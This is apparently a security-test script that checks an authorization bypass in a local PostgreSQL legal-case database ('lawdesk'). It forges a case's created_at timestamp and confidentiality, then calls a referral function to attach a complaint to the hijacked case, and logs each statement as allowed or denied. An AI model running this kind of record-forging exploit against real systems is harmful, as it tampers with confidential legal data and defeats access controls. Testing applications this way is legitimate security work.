import psycopg2
c=psycopg2.connect(host='127.0.0.1',port=int(__import__('os').environ.get('PGP','55432')),user='lawdesk_legal',dbname='lawdesk'); c.autocommit=False
cur=c.cursor()
def t(sql,*a):
    try:
        cur.execute(sql,a); print('OK  ',sql[:100],'=>',cur.fetchall() if cur.description else cur.statusmessage)
    except Exception as e:
        print('DENY',sql[:100],'=>',e.pgcode,str(e).splitlines()[0]); c.rollback(); return False
    return True
# H-A: hijack pre-existing case by forging created_at (legal credential, plain DML, no function)
t("update lawdesk.legal_case set confidentiality='RESTRICTED', created_at=transaction_timestamp() where id='00000000-0000-0000-0000-0000000009a1'")
t("select lawdesk.r6_complete_referral('00000000-0000-0000-0000-00000000f303','00000000-0000-0000-0000-0000000009a1','00000000-0000-0000-0000-0000000000a2')")
c.commit()
cur.execute("select c.status, l.case_id, k.title, k.created_at::date from lawdesk.complaint c join lawdesk.complaint_case_link l on l.complaint_id=c.id join lawdesk.legal_case k on k.id=l.case_id where c.id='00000000-0000-0000-0000-00000000f303'"); print('RESULT',cur.fetchall())
